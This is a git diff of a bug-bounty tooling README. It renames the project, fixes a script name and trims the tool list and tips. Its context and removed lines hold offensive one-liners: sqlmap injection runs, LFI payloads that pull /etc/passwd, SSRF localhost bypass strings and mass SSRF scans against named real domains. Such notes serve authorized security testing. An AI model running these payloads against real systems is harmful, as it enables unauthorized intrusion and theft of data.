@@ -1,4 +1,4 @@
-# Awesome Bug Bounty Builder ¯\\_(ツ)_/¯
+# Bug Bounty Builder ¯\\_(ツ)_/¯
 
 
 <div align="center">
@@ -10,7 +10,7 @@
 <a href="https://github.com/0xJin/awesome-bugbounty-builder/stargazers"><img alt="GitHub stars" src="https://img.shields.io/github/stars/0xJin/awesome-bugbounty-builder"></a>
 
 
-<p><i> Awesome Bug bounty builder Project - ALL common Tools for find your Vulnerabilities.</i></p>
+<p><i> Bug Bounty builder Project - ALL common Tools for find your Vulnerabilities.</i></p>
 </div>
 
 
@@ -28,7 +28,7 @@
 ```sh
 $ git clone https://github.com/0xJin/awesome-bugbounty-builder.git
 $ cd awesome-bugbounty-builder/
-$ chmod +x awesome-bugbounty-build.sh
+$ chmod +x awesome-bugbounty-builder.sh
 $ ./awesome-bugbounty-builder.sh
 ```
 
@@ -64,6 +64,7 @@ $ ./awesome-bugbounty-builder.sh
 - exiftool 
 - XSRFProbe 
 - XXE Exploiter
+- Rush
 - Rustscan
 - LFISuite
 - Wapiti
@@ -71,15 +72,6 @@ $ ./awesome-bugbounty-builder.sh
 - URO
 - Freq
 - Subzy
-- OpenRedireX
-- GooFuzz
-- Fuxploider
-- CRLFUZZ
-- CENT
-- Liffy
-- SSRF-tool
-- Infoooze
-- Ghauri
 
 ---
 
@@ -127,7 +119,6 @@ $ ffuf -ac -u FUZZ -w fuzzing.txt -replay-proxy 127.0.0.1:8080
 $ amass enum -brute -passive -d example.com | httpx -silent -status-code | tee domain.txt
 $ cat domain.txt | gauplus -random-agent -t 200 | gf sqli | tee domain2.txt
 $ sqlmap -m domain2.txt -dbs --batch --random-agent
-$ subfinder -dL domains.txt | dnsx | waybackurl | uro  | grep "\?" | head -20 | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
 // **SQL Injection headers**
 $ sqlmap -u "http://redacted.com" --header="X-Forwarded-For: 1*" --dbs --batch --random-agent --threads=10
 // **SQL Injection bypass 401**
@@ -193,8 +184,6 @@ $ export LHOST="http://localhost"; gau $1 | gf redirect | qsreplace "$LHOST" | x
 
 ```sh
 $ gauplus -random-agent -t 200 http://redacted.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
-$ assetfinder -subs-only target.com | httpx -silent -nc -p 80,443,8080,8443,9000,9001,9002,9003,8888,8088,8808 -path "/logs/downloadMainLog?fname=../../../../../../..//etc/passwd" -mr "root:x:" -t 60
-$ cat domains.txt | gauplus -random-agent -t 10 | gf lfi | qsreplace ".%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./etc/passwd" | httpx -silent -nc -mr "root:x:" -t 250 
 ```
 
 
@@ -212,14 +201,6 @@ http://whitelisted@127.0.0.1
 http://0x7f000001/
 http://017700000001
 http://0177.00.00.01
-```
-
-
-### Best SSRF Tips using this tool :
-
-```sh
-$ amass enum -passive -brute -d yahoo.com -silent | httpx -silent | tee domains.txt | ssrf-tool -domains domains.txt -payloads payloads.txt -silent=false -paths=true -patterns patterns.txt
-$ echo "twitter.com" | gauplus -random-agent -t 100 | tee domains.txt; ssrftool -domains domains.txt -silent=false -paths=false -payloads payloads.txt
 ```
 
 
@@ -366,18 +347,6 @@ X-Override-URL: /admin
 X-Rewrite-URL: /admin
 ```
 
----
-
-### Web Cache Deception : 
-
-https://hackerone.com/reports/397508
-
----
-
-### Web Cache Poisoning :
-
-https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9
-
 
 ---
 
@@ -408,8 +377,11 @@ https://github.com/Karanxa/Bug-Bounty-Wordlists
 
 ## Thanks 
 
-<a href="https://www.buymeacoffee.com/0xJin" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-red.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a>
+**[`^        back to top        ^`](#)**
 
-Don't forget to follow me on Twitter.
+## License
+MIT License & [cc](https://creativecommons.org/licenses/by/4.0/) license
 
-[@0xJin](https://twitter.com/0xJin) - This tool is made with ❤️ by 0xJin ¯\\_(ツ)_/¯.
+<a rel="license" href="http://creativecommons.org/licenses/by/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by/4.0/88x31.png" /></a><br />This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.
+
+To the extent possible under law, [Paul Veillard](https://github.com/paulveillard/) has waived all copyright and related or neighboring rights to this work.
